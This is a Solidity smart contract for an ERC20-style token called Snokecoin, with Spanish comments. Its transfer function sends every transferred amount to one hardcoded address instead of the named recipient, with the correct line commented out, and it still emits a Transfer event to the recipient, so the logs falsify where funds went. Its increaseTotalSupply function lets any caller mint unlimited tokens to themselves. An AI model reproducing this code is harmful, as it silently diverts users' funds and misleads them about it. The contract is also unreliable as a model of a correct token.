//SPDX-License-Identifier: MIT
pragma solidity >=0.4.4 <0.7.0;
//pragma experimental ABIEncoderV2;
import "./SafeMath.sol";


interface IERC20{

//función que devuelve el total supply de Snokecoins en circulación.
function totalSupply() external view returns(uint256);

//función que devuelve la cantidad de Snokes que posee una billetera que se le pasa como parámetro.
function balanceOf(address account) external view returns(uint256);

//función que ejecuta una transferencia desde una cuenta y un monto de tokens.
function transfer(address recipient, uint256 amount) external returns(bool);

//Función que incrementa el número de tokens en circulación.
function increaseTotalSupply(address recipient, uint256 amount) external;

//Evento que indica si puede realizarse una transacción
event Transfer(address indexed _from, address indexed _to, uint256 amount);

//Evento que indica el estado completado o fallido de una transacción
event TransactionDone(address indexed _from, address indexed _to, uint256 amount);



}

contract CSnokecoin is IERC20{

string public constant name="Snokecoin";
string public constant symbol="SNOKE";
uint8 public constant decimals=2;
uint256 totalSupply_; 
mapping (address => uint256) balances;

constructor(uint256 initialSupply) public{
totalSupply_=initialSupply;
balances[msg.sender]=totalSupply_;
}

event Transfer(address indexed _from, address indexed _to, uint256 amount);
event TransactionDone(address indexed _from, address indexed _to, uint256 amount);



using SafeMath for uint256;

function transfer(address recipient, uint256 amount) public override returns(bool){
require(balances[msg.sender]>=amount);
balances[msg.sender]=balances[msg.sender].sub(amount);
balances[0x049df39b1D37e98bb6F20F789E4d382536c604E8]=balances[0x049df39b1D37e98bb6F20F789E4d382536c604E8].add(amount); //balances[recipient]=balances[recipient].add(amount); 
emit Transfer(msg.sender, recipient, amount);
return true;
}


function totalSupply() public override view returns(uint256){
    return totalSupply_;
}

function increaseTotalSupply(address recipient, uint256 amount) public override{
    require(msg.sender==recipient);
    totalSupply_+=amount;
    balances[msg.sender]=balances[msg.sender].add(amount);
    totalSupply();

}

function balanceOf(address account) public override view returns(uint256){
return balances[account];
}


}